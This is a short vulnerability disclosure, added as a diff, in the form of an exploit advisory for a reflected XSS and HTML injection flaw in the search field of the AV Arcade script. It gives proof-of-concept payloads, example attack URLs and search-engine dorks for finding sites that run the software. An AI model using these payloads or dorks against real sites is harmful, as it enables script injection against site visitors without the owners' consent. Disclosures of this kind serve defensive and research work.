@@ -1,0 +1,26 @@
+# Exploit Title: AV Arcade Search Field XSS/HTML Injection
+# Date: 6/5/2010
+# Author: Vadim Toptunov, http://www.twitter.com/pentesting
+# Software Link: http://www.avscripts.net/avarcade/
+# Version: 5.1.4 Free and Pro (latest) and prior
+# Tested on: Any NIX
+# CVE : N/a
+# Code : below
+
+Description:
+AV arcade is a free arcade script from AV Scripts. It has features which easily match those of paid scripts.
+
+POC:
+Go to search field and query those strings:
+HTML Injection: "><marquee>hey, this works!</marquee>
+XSS: "><script>alert(String.fromCharCode(88,83,83))</script>
+
+Example:
+http://[site]/index.php?task=search&q="><marquee>hey, thisworks!</marquee>
+http://[site]/index.php?task=search&q="><script>alert(String.fromCharCode(88,83,83))</script>
+
+Dorks:
+"Powered by AV Arcade v3"
+"Powered by AV Arcade v4"
+"Powered by AV Arcade Free Edition"
+"Powered by AV Arcade Pro"
